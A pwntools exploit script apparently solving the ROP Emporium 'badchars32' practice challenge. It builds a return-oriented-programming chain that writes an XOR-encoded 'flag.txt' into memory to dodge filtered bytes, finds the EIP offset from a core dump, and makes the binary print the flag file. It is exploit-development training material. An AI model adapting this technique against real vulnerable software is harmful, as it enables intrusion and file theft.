#!/usr/bin/python3
from pwn import *

def start():
	binary_path = "./badchars32"
	p = process(binary_path)
	gdb.attach(p, gdbscript = '''
		b main
		continue
	''')
	return p

elf = context.binary = ELF("./badchars32")
context.log_level = "info"
context.delete_corefiles = True

data_section = elf.symbols.data_start

rop = ROP(elf)
#mov_edi_esi = rop.find_gadget(["mov dword ptr [edi]", "esi", "ret"])[0]
#xor_ebp_bl = rop.find_gadget(["xor byte ptr [ebp]", "bl", "ret"])[0]
mov_edi_esi = elf.symbols.usefulGadgets + 12
xor_ebp_bl = elf.symbols.usefulGadgets + 4
pop_ebp = rop.find_gadget(["pop ebp", "ret"])[0]
pop_ebx = rop.find_gadget(["pop ebx", "ret"])[0]
pop_esi_edi_ebp = rop.find_gadget(["pop esi", "pop edi", "pop ebp", "ret"])[0]

xor_val = 2
xored_flag = xor("flag.txt", xor_val)
info("xored_flag = %s", xored_flag)

rop.raw([pop_esi_edi_ebp, xored_flag[:4], data_section, 0, mov_edi_esi])
rop.raw([pop_esi_edi_ebp, xored_flag[4:], data_section + 4, 0, mov_edi_esi])

xor_rev = b''
xor_offset = 0

for i in xored_flag:
	xor_rev += pack(pop_ebp)
	xor_rev += pack(data_section + xor_offset)
	xor_rev += pack(pop_ebx)
	xor_rev += pack(xor_val)
	xor_rev += pack(xor_ebp_bl)
	xor_offset += 1

rop.raw(xor_rev)

rop.print_file(data_section)

rop_chain = rop.chain()

io = start()
payload = cyclic(100, alphabet = "bcdefhijkl")
io.sendlineafter(">", payload)
io.wait()
core = io.corefile

eip = core.eip
eip_offset = cyclic_find(eip, alphabet = "bcdefhijkl")



io = start()
payload = flat({
	eip_offset: rop_chain

})
io.sendlineafter(">", payload)

while True:
	tmp = io.recv()
	info(tmp)




